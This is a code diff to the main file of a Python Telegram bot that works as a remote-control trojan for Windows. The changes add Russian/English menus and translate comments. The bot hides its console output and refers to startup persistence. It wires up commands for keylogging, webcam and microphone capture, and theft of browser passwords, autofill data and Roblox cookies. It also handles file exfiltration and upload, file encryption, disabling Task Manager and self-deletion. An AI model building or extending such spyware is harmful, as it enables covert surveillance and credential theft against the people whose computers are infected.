@@ -28,18 +28,19 @@ import subprocess
 import winreg
 from aiogram import types
 from aiogram.filters import Command
+from aiogram import F
 
-## Отключение вывода на экран
+
+
 sys.stdout = open(os.devnull, 'w')  
 sys.stderr = open(os.devnull, 'w')  
 logging.basicConfig(level=logging.CRITICAL + 1)
 logging.getLogger('aiogram').disabled = True
 
-# ## Включаем логирование, чтобы не пропустить важные сообщения
+
 logging.basicConfig(level=logging.INFO)
 
 
-# Объект бота
 from config import bot, dp
 
 
@@ -107,169 +108,223 @@ def add_to_startup_folder(script_path):
         pass
 
 
+from lib.texts import user_languages
+
+# Texts for different languages
+TEXTS = {
+    'ru': {
+        'start': (
+            " Приветствую, root. Я готов к работе.\n\n"
+            " Доступные команды:\n\n"
+            " Основное управление:\n"
+            "/start — Запустить бота\n"
+            "/pc_data — Получить информацию о ПК\n"
+            "/network_diagnostics — Диагностика сети\n"
+            "/shutdown_pc — Выключить ПК\n"
+            "/restart_pc — Перезагрузить ПК\n"
+            "/self_destruction — Удалить бота с устройства\n\n"
+            " Безопасность и защита:\n"
+            "/antivirus — Проверить антивирусные программы\n"
+            "/cmd_boom — Вывести ошибку CMD\n"
+            "/close_task_manager — Закрыть диспетчер задач\n\n"
+            " Скриншоты и запись:\n"
+            "/screenshot — Сделать скриншот\n"
+            "/snapshot — Фото с веб-камеры\n"
+            "/web_record — Видеозапись с веб-камеры\n"
+            "/audio_record — Запись звука с микрофона\n"
+            "/play_sound — Проиграть звук\n\n"
+            " Мониторинг:\n"
+            "/key_logger — Запустить кейлоггер\n"
+            "/key_logs — Получить лог клавиш\n"
+            "/clipboard_content — Буфер обмена\n"
+            "/chrome_history — История Chrome\n"
+            "/opera_history — История Opera\n"
+            "/autofill — Автозаполнения браузера\n"
+            "/passwords — Пароли браузера\n"
+            "/robloxcookie — Получить Roblox cookie\n\n"
+            "/processes — Активные процессы\n"
+            "/fullprocesses — Все процессы\n"
+            "/terminate_process — Завершить процесс\n\n"
+            " Файлы и директории:\n"
+            "/send_file — Получить файл\n"
+            "/upload_file — Загрузить файл\n"
+            "/delete_file — Удалить файл\n"
+            "/move_file — Переместить файл\n"
+            "/create_folder — Создать папку\n"
+            "/delete_folder — Удалить папку\n"
+            "/show_directory_content — Список файлов\n"
+            "/change_directory — Сменить директорию\n\n"
+            " Удалённые действия:\n"
+            "/open_url — Открыть ссылку в браузере\n"
+            "/alt_f4 — Закрыть активное окно\n"
+            "/minimize_all_windows — Свернуть все окна\n"
+            "/change_wallpaper — Сменить обои рабочего стола\n\n"
+            " Управление звуком:\n"
+            "/mute_sound — Выключить звук\n"
+            "/unmute_sound — Включить звук\n"
+            "/set_volume_100 — Установить громкость 100%\n\n"
+            " Шифрование:\n"
+            "/encrypt_file — Зашифровать файл\n"
+            "/decipher_file — Расшифровать файл\n"
+        ),
+        'ready': "Готов к использованию",
+        'choose_language': "Выберите язык / Choose language:",
+        'language_buttons': ["Русский 🇷🇺", "English 🇬🇧"],
+        'language_selected': "Язык установлен на русский 🇷🇺",
+        'buttons': [
+            ["Смена языка"],
+            ["Антивирус", "Скриншот"],
+            ["Процесы", "Фото с камеры"],
+            ["Полный отчет по процесам", "Завершить процесс"],
+            ["Создать папку", "Удалить папку"],
+            ["Содержание директории", "Переместиться по директории"],
+            ["Данные ПК", "Диагностика сети"],
+            ["Запись с веб камеры", "Запись аудио"],
+            ["Открыть файл", "Загрузить файл"],
+            ["Скачать файл", "Удалить файл"],
+            ["Зашифровать файл", "Расшифровать файл"],
+            ["История хрома", "История оперы"],
+            ["Автозаполнения браузера", "Пароли браузера"],
+            ["Роблокс куки"],
+            ["ALT + F4", "Свернуть все окна"],
+            ["Посмотреть буфер обмена", "Изменить буфер обмена"],
+            ["Закрыть диспетчер задач", "Открыть ссылку"],
+            ["Включить звук", "Выключить звук"],
+            ["Звук на 100%", "CMD бомба"],
+            ["Выключить ПК", "Перезагрузить ПК"],
+            ["Перемистить файл", "Поменять обои"],
+            ["key logger", "key logs"],
+            ["Воспроизвести звук", "Самоуничтожение"]
+        ]
+    },
+    'en': {
+        'start': (
+            " Welcome, root. I'm ready to work.\n\n"
+            " Available commands:\n\n"
+            " Basic control:\n"
+            "/start — Start the bot\n"
+            "/pc_data — Get PC info\n"
+            "/network_diagnostics — Network diagnostics\n"
+            "/shutdown_pc — Shut down PC\n"
+            "/restart_pc — Restart PC\n"
+            "/self_destruction — Remove the bot from the device\n\n"
+            " Security:\n"
+            "/antivirus — Check antivirus\n"
+            "/cmd_boom — Show CMD error\n"
+            "/close_task_manager — Close Task Manager\n\n"
+            " Screenshots and Recording:\n"
+            "/screenshot — Take screenshot\n"
+            "/snapshot — Webcam photo\n"
+            "/web_record — Webcam video\n"
+            "/audio_record — Microphone audio\n"
+            "/play_sound — Play a sound\n\n"
+            " Monitoring:\n"
+            "/key_logger — Start keylogger\n"
+            "/key_logs — Get key logs\n"
+            "/clipboard_content — Clipboard content\n"
+            "/chrome_history — Chrome history\n"
+            "/opera_history — Opera history\n"
+            "/autofill — Browser autofills\n"
+            "/passwords — Browser passwords\n"
+            "/robloxcookie — Get Roblox cookie\n\n"
+            "/processes — Active processes\n"
+            "/fullprocesses — All processes\n"
+            "/terminate_process — Kill process\n\n"
+            " Files:\n"
+            "/send_file — Get file\n"
+            "/upload_file — Upload file\n"
+            "/delete_file — Delete file\n"
+            "/move_file — Move file\n"
+            "/create_folder — Create folder\n"
+            "/delete_folder — Delete folder\n"
+            "/show_directory_content — Directory content\n"
+            "/change_directory — Change directory\n\n"
+            " Remote Actions:\n"
+            "/open_url — Open URL\n"
+            "/alt_f4 — Close active window\n"
+            "/minimize_all_windows — Minimize all windows\n"
+            "/change_wallpaper — Change wallpaper\n\n"
+            " Sound:\n"
+            "/mute_sound — Mute\n"  
+            "/unmute_sound — Unmute\n"
+            "/set_volume_100 — Set volume to 100%\n\n"
+            " Encryption:\n"
+            "/encrypt_file — Encrypt file\n"
+            "/decipher_file — Decrypt file\n"
+        ),
+        'ready': "Ready to use",
+        'choose_language': "Choose language / Выберите язык:",
+        'language_buttons': ["Русский 🇷🇺", "English 🇬🇧"],
+        'language_selected': "Language set to English 🇬🇧",
+        'buttons': [
+            ["Change language"],
+            ["Antivirus", "Screenshot"],
+            ["Processes", "Webcam Photo"],
+            ["Full process report", "Terminate process"],
+            ["Create folder", "Delete folder"],
+            ["Directory contents", "Change directory"],
+            ["PC Info", "Network diagnostics"],
+            ["Webcam record", "Audio record"],
+            ["Open file", "Upload file"],
+            ["Download file", "Delete file"],
+            ["Encrypt file", "Decrypt file"],
+            ["Chrome history", "Opera history"],
+            ["Browser autofill", "Browser passwords"],
+            ["Roblox cookie"],
+            ["ALT + F4", "Minimize all windows"],
+            ["View clipboard", "Change clipboard"],
+            ["Close task manager", "Open URL"],
+            ["Unmute sound", "Mute sound"],
+            ["Volume 100%", "CMD bomb"],
+            ["Shutdown PC", "Restart PC"],
+            ["Move file", "Change wallpaper"],
+            ["Key logger", "Key logs"],
+            ["Play sound", "Self-destruct"]
+        ]
+    }
+}
+
+# /start command handler
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
-    await message.answer(
-    " Приветствую, root. Я готов к работе.\n\n"
-    " Доступные команды:\n\n"
+    user_id = message.from_user.id
+    lang = user_languages.get(user_id, 'en')
+    text = TEXTS[lang]['start']
+    await message.answer(text)
 
-    " Основное управление:\n"
-    "/start — Запустить бота\n"
-    "/pc_data — Получить информацию о ПК\n"
-    "/network_diagnostics — Диагностика сети\n"
-    "/shutdown_pc — Выключить ПК\n"
-    "/restart_pc — Перезагрузить ПК\n"
-    "/self_destruction — Удалить бота с устройства\n\n"
+    # Creating the keyboard using the selected language
+    buttons = [[types.KeyboardButton(text=btn) for btn in row] for row in TEXTS[lang]['buttons']]
+    keyboard = types.ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)
+    await message.answer(TEXTS[lang]['ready'], reply_markup=keyboard)
 
-    " Безопасность и защита:\n"
-    "/antivirus — Проверить антивирусные программы\n"
-    "/cmd_boom — Вывести ошибку CMD\n"
-    "/close_task_manager — Закрыть диспетчер задач\n\n"
-
-    " Скриншоты и запись:\n"
-    "/screenshot — Сделать скриншот\n"
-    "/snapshot — Фото с веб-камеры\n"
-    "/web_record — Видеозапись с веб-камеры\n"
-    "/audio_record — Запись звука с микрофона\n"
-    "/play_sound — Проиграть звук\n\n"
-
-    " Мониторинг:\n"
-    "/key_logger — Запустить кейлоггер\n"
-    "/key_logs — Получить лог клавиш\n"
-    "/clipboard_content — Буфер обмена\n"
-    "/chrome_history — История Chrome\n"
-    "/opera_history — История Opera\n"
-    "/autofill — Автозаполнения браузера\n" ## NEW
-    "/passwords — Пароли браузера\n" ## NEW
-    "/robloxcookie — Получить Roblox cookie\n\n"
-    "/processes — Активные процессы\n"
-    "/fullprocesses — Все процессы\n"
-    "/terminate_process — Завершить процесс\n\n"
-
-    " Файлы и директории:\n"
-    "/send_file — Получить файл\n"
-    "/upload_file — Загрузить файл\n"
-    "/delete_file — Удалить файл\n"
-    "/move_file — Переместить файл\n"
-    "/create_folder — Создать папку\n"
-    "/delete_folder — Удалить папку\n"
-    "/show_directory_content — Список файлов\n"
-    "/change_directory — Сменить директорию\n\n"
-
-    " Удалённые действия:\n"
-    "/open_url — Открыть ссылку в браузере\n"
-    "/alt_f4 — Закрыть активное окно\n"
-    "/minimize_all_windows — Свернуть все окна\n"
-    "/change_wallpaper — Сменить обои рабочего стола\n\n"
-
-    " Управление звуком:\n"
-    "/mute_sound — Выключить звук\n"
-    "/unmute_sound — Включить звук\n"
-    "/set_volume_100 — Установить громкость 100%\n\n"
-
-    " Шифрование:\n"
-    "/encrypt_file — Зашифровать файл\n"
-    "/decipher_file — Расшифровать файл\n"
-)
-
-
-
-    kb = [
-        [
-            types.KeyboardButton(text="Антивирус"),
-            types.KeyboardButton(text="Скриншот"), # FIXED
-        ],
-        [
-            types.KeyboardButton(text="Процесы"),
-            types.KeyboardButton(text="Фото с камеры")
-        ],
-        [
-            types.KeyboardButton(text="Полный отчет по процесам"),
-            types.KeyboardButton(text="Завершить процесс")
-        ],
-        [
-            types.KeyboardButton(text="Создать папку"),
-            types.KeyboardButton(text="Удалить папку")
-        ],
-        [
-            types.KeyboardButton(text="Содержание директории"),
-            types.KeyboardButton(text="Переместиться по директории")
-        ],
-        [
-            types.KeyboardButton(text="Данные ПК"),
-            types.KeyboardButton(text="Диагностика сети")
-        ],
-        [
-            types.KeyboardButton(text="Запись с веб камеры"),
-            types.KeyboardButton(text="Запись аудио")
-        ],
-        [
-            types.KeyboardButton(text="Открыть файл"),
-            types.KeyboardButton(text="Загрузить файл")
-        ],
-        [
-            types.KeyboardButton(text="Скачать файл"),
-            types.KeyboardButton(text="Удалить файл")
-        ],
-        [
-            types.KeyboardButton(text="Зашифровать файл"),
-            types.KeyboardButton(text="Расшифровать файл")
-        ],
-        [
-            types.KeyboardButton(text="История хрома"),
-            types.KeyboardButton(text="История оперы")
-        ],
-        [
-            types.KeyboardButton(text="Автозаполнения браузера"), # NEW
-            types.KeyboardButton(text="Пароли браузера") # NEW
-        ],
-        [
-            types.KeyboardButton(text="Роблокс куки") # NEW
-        ],
-        [
-            types.KeyboardButton(text="ALT + F4"),
-            types.KeyboardButton(text="Свернуть все окна")
-        ],
-        [
-            types.KeyboardButton(text="Посмотреть буфер обмена"),
-            types.KeyboardButton(text="Изменить буфер обмена")
-        ],
-        [
-            types.KeyboardButton(text="Закрыть диспетчер задач"),
-            types.KeyboardButton(text="Открыть ссылку")
-        ],
-        [
-            types.KeyboardButton(text="Включить звук"),
-            types.KeyboardButton(text="Выключить звук")
-        ],
-        [
-            types.KeyboardButton(text="Звук на 100%"),
-            types.KeyboardButton(text="CMD бомба")
-        ],
-        [
-            types.KeyboardButton(text="Выключить ПК"),
-            types.KeyboardButton(text="Перезагрузить ПК")
-        ],
-        [
-            types.KeyboardButton(text="Перемистить файл"),
-            types.KeyboardButton(text="Поменять обои")
-        ],
-        [
-            types.KeyboardButton(text="key logger"), # NEW 
-            types.KeyboardButton(text="key logs") # NEW
-        ],
-        [
-            types.KeyboardButton(text="воспроизвести звук"),# NEW 
-            types.KeyboardButton(text="Самоуничтожение")
-        ],
+# /language command
+@dp.message(Command("language"))
+async def cmd_language(message: types.Message):
+    lang_buttons = [
+        [types.KeyboardButton(text=TEXTS['ru']['language_buttons'][0]),
+         types.KeyboardButton(text=TEXTS['ru']['language_buttons'][1])]
     ]
-    keyboard = types.ReplyKeyboardMarkup(
-        keyboard=kb,
-        resize_keyboard=True,
+    keyboard = types.ReplyKeyboardMarkup(keyboard=lang_buttons, resize_keyboard=True)
+    await message.answer(TEXTS['ru']['choose_language'], reply_markup=keyboard)
 
-    )
-    await message.answer("Готов к использованию", reply_markup=keyboard)
-user_directories = {}
+# Language selection handler
+@dp.message(F.text.in_({"Русский 🇷🇺", "English 🇬🇧"}))
+async def handle_language_choice(message: types.Message):
+    user_id = message.from_user.id
+    if message.text == "Русский 🇷🇺":
+        user_languages[user_id] = 'ru'
+        await message.answer(TEXTS['ru']['language_selected'])
+    elif message.text == "English 🇬🇧":
+        user_languages[user_id] = 'en'
+        await message.answer(TEXTS['en']['language_selected'])
+
+    
+    await cmd_start(message)
+
+@dp.message(F.text.in_({"Смена языка", "Change language"}))
+async def handle_language_button(message: types.Message):
+    await cmd_language(message)
+
 
 
 ###########################  ROBLOX COOKIE  #############################
@@ -320,61 +375,61 @@ from lib.Access.Screenshot.screenshot_handlers import register_screenshot_handle
 
 register_screenshot_handlers(dp)
 
-######################## Делаем снимок с камеры  #########################
+######################## Snapshot  #########################
 
 from lib.Access.Webcam.Snapshot import register_snapshot_handlers
 
 register_snapshot_handlers(dp)
 
-##########################  Список процессов  ############################
+##########################  Processes list  ############################
 
 from lib.System.Procceses.process import register_processes_handlers
 
 register_processes_handlers(dp)
 
-########################  Полный список процессов  ########################
+########################  Full list of processes  ########################
 
 from lib.System.Procceses.fullprocesses import register_full_processes_handlers
 
 register_full_processes_handlers(dp)
 
-##########################  Завершение процесса ############################
+##########################  Terminating process ############################
 
 from lib.System.Procceses.terminate_process import register_terminate_process_handlers
 
 register_terminate_process_handlers(dp)
 
-############################  Создать папку  ################################
+############################  Create a folder  ################################
 
 from lib.System.Folders.create_folder import register_create_folder
 
 register_create_folder(dp)
 
-############################  Удалить папку  ################################
+############################  Delete the folder  ################################
 
 from lib.System.Folders.delete_fodlder import register_folder_delete
 
 register_folder_delete(dp)
 
-###########################  Скачать файл  ###################################
+###########################  Download a file  ###################################
 
 from lib.System.File.download_file import register_download_file
 
 register_download_file(dp)
 
-#############################  Удалить файл  #################################
+#############################  Delete the file  #################################
 
 from lib.System.File.delete_file import register_delete_file
 
 register_delete_file(dp)
 
-########################  Содержание директории  ############################
+########################  Directory value  ############################
 
 from lib.System.More.directory_value import register_directory_value
 
 register_directory_value(dp)
 
-#########################  Перейти к директории  #############################
+#########################  Move to directory  #############################
 
 from lib.System.More.move_to_directory import register_cd
 
@@ -386,7 +441,7 @@ from lib.Credintial.Chrome_history import register_chrome_history_handlers
 
 register_chrome_history_handlers(dp)
 
-#####################  Делаем сьемку с веб-камеры  #######################
+#####################  Webcam record  #######################
 
 from lib.Access.Webcam.Web_record import register_webcam_record_handlers
 
@@ -398,7 +453,7 @@ from lib.System.Folders.altf4 import register_alt_f4_handlers
 
 register_alt_f4_handlers(dp)
 
-##############################  Закрытие окон  ############################
+##############################  Close the folder  ############################
 
 from lib.System.Folders.closefolders import register_minimize_all_windows_handlers
 
@@ -413,31 +468,31 @@ from lib.states import DirectoryStateSaveFiles
 register_open_file_handlers(dp)
 
 
-############################  Загрузить файл  #############################
+############################  Load a file  #############################
 
 from lib.System.File.load_file import register_load_file
 
 register_load_file(dp)
 
-############################# Запись аудио ###############################
+############################# Audio record ###############################
 
 from  lib.Access.Audio.recordmic_handlers import register_audio_handlers
 
 register_audio_handlers(dp)
 
-#######################  Посмотреть буфер обмена  #########################
+#######################  Check copied  #########################
 
 from lib.System.More.check_copied import register_check_copied
 
 register_check_copied(dp)
 
-###########################  Открыть ссылку  ##############################
+###########################  Open url  ##############################
 
 from lib.System.More.open_url import register_open_url
 
 register_open_url(dp)
 
-########################  Закрыть диспетчер задач  ##########################
+########################  Close dp  ##########################
 
 from lib.System.More.close_dp import register_close_dp
 
@@ -449,79 +504,79 @@ from lib.Credintial.Opera_history import register_opera_history_handlers
 
 register_opera_history_handlers(dp)
 
-###########################  Выключить звук  #############################
+###########################  Sound off  #############################
 
 from lib.System.Sound.Sound_off import register_mute_handlers
 
 register_mute_handlers(dp)
 
-###########################  Включить звук  ##############################
+###########################  Sound on  ##############################
 
 from lib.System.Sound.Sound_on import register_sound_handlers
 
 register_sound_handlers(dp)
 
-########################  Включить звук на 100%  ##########################
+########################  Volume 100%  ##########################
 
 from lib.System.Sound.volume_100 import register_volume_100
 
 register_volume_100(dp)
 
-##########################  Зашифровать файл  #############################
+##########################  Encrypt file  #############################
 
 from lib.System.Crypt.Encrypt import register_encrypt_handlers
 
 register_encrypt_handlers(dp)
 
-############################  Расшифровка  ###############################
+############################ Discrypt file  ###############################
 
 from lib.System.Crypt.discrypt import register_discrypt
 
 register_discrypt(dp)
 
-###############################  CMD Бомба  ###############################
+###############################  CMD bomb  ###############################
 
 from lib.System.PC.cmd_bomb import register_cmd_bomb
 
 register_cmd_bomb(dp)
 
-###########################  Информация про ПК  ###########################
+###########################  PC info  ###########################
 
 from lib.System.PC.pc_data import register_pc_data
 
 register_pc_data(dp)
 
-##########################  Информция про сеть  ##########################
+##########################  Wifi info  ##########################
 
 from lib.System.PC.wifi_data import register_wifi_data
 
 register_wifi_data(dp)
 
-###########################  Выключение ПК  #############################
+###########################  PC off  #############################
 
 from lib.System.PC.pc_off import register_shutdown_handlers
 
 register_shutdown_handlers(dp)
 
-###########################  Перезапуск ПК  ##############################
+###########################  PC on  ##############################
 
 from lib.System.PC.pc_reboot import register_reboot_handlers
 
 register_reboot_handlers(dp)
 
-############################  Смена обоев  ###############################
+############################  Wallpaper change  ###############################
 
 from lib.System.PC.change_wallpaper import register_wallpaper_handlers
 
 register_wallpaper_handlers(dp)
 
-#########################  Перемещение файла  #############################
+#########################  Move file  #############################
 
 from lib.System.Folders.move_file import register_move_file
 
 register_move_file(dp)
 
-#############################  Самоуничтожение  ###########################
+#############################  Self destruction  ###########################
 
 from lib.System.PC.self_destruction import register_self_destruction
 
